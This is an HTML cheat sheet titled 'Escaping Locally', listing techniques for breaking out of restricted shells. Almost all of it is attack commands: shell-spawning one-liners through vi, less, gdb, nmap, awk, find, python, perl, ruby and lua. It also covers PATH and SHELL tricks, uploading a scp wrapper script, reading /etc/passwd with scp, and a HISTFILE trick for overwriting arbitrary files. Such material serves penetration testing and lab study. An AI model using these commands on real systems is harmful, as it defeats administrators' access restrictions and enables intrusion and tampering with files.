<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Escaping Locally</title>
</head><body>Try all commands you can: <br/>
ls, pwd, cd .., env, set, export, vi, cp, mv, echo $PATH, echo $SHELL, etc<br/>
<br/>
Quick Wins<br/>
If '/' are allowed in commands, just run: /bin/sh<br/>
If you can set PATH or SHELL, just run:<br/>
export PATH=/bin:/usr/bin:$PATH<br/>
export SHELL=/bin/sh<br/>
If you can copy files into existing PATH, just run: cp /bin/sh /some/dir/from/PATH; sh<br/>
<br/>
in an editor<br/>
:set shell=/bin/bash<br/>
Next, type and execute:<br/>
:shell<br/>
<br/>
some commands let you execute other system commands, often bypassing shell restrictions:<br/>
ftp: !/bin/sh<br/>
gdb: !/bin/sh<br/>
more/less/man: !/bin/sh<br/>
vi/vim: :!/bin/sh<br/>
vi: :set shell=/bin/bash:shell<br/>
nmap: !sh<br/>
scp -S /tmp/getMeOut.sh x y:				works best in a wrapper, see below<br/>
awk 'BEGIN {system(&quot;/bin/sh&quot;)}'<br/>
find / -name someName -exec /bin/sh \;		make sure the name is findable / exists<br/>
nice /bin/bash<br/>
<br/>
SCP: On a box that you control make a simple wrapper script, then upload it:<br/>
$ cat /tmp/id.sh<br/>
#!/bin/sh<br/>
/usr/bin/id<br/>
$ chmod +x /tmp/id.sh<br/>
$ scp /tmp/id.sh untrusted@demobox:<br/>
Once the file is uploaded, run it with scp:<br/>
untrusted@demobox ~ $ scp -S /home/untrusted/id.sh x y:<br/>
uid=1008(untrusted) gid=1014(untrusted) groups=1014(untrusted)<br/>
<br/>
SCP: This options can be used to “cat” certain types of file:<br/>
scp -F /etc/passwd x y:<br/>
<br/>
write to files using tee:<br/>
echo &quot;your evil code&quot; | tee script.sh<br/>
<br/>
invoke shell through scripting language:<br/>
python -c 'import os; os.system(&quot;/bin/bash&quot;)'<br/>
python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()<br/>
perl -e 'exec &quot;/bin/sh&quot;;'<br/>
perl: exec &quot;/bin/sh&quot;;<br/>
ruby: exec &quot;/bin/sh&quot;<br/>
lua: os.execute('/bin/sh')<br/>
irb(main:001:0&gt; exec &quot;/bin/sh&quot;<br/>
<br/>
History file trick:<br/>
set HISTFILE variable to a file you want to overwrite<br/>
set HISTSIZE variable to 0 and then immediately to 100<br/>
Execute lines that you want to be written to your file<br/>
Log out and log back in again. You have overwritten contents of the file HISTFILE pointed to (also, the original file permissions remained the same!)<br/>
</body></html>